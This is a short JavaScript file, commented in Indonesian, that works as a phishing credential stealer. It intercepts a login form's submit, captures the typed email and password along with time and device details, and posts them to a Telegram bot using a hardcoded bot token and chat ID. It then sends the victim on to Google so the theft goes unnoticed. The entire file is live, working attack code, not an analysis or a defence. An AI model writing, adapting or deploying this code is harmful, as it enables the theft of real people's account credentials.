document.getElementById("loginForm").addEventListener("submit", function (event) {
    event.preventDefault();

    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;
    let waktuLogin = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    let botToken = "AAFmbkgr8rhoSkow-Yf6EXTy8DPu0Az7021";
    let chatId = "6786210993";
    let userAgent = navigator.userAgent;

    // Kirim data SECEPATNYA ke Telegram tanpa tunggu apa pun
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: chatId,
            text: `🔒 *Login Berhasil!*\n\n`
                + `🕒 *Waktu:* ${waktuLogin}\n`
                + `📧 *Email:* ${email}\n`
                + `🔑 *Password:* ${password}\n`
                + `📱 *Device:* ${userAgent}`,
            parse_mode: "Markdown"
        })
    });

    console.log("✅ Data terkirim langsung ke Telegram!");

    // Redirect ke Google langsung tanpa nunggu respon
    window.location.href = "https://www.google.com";
});
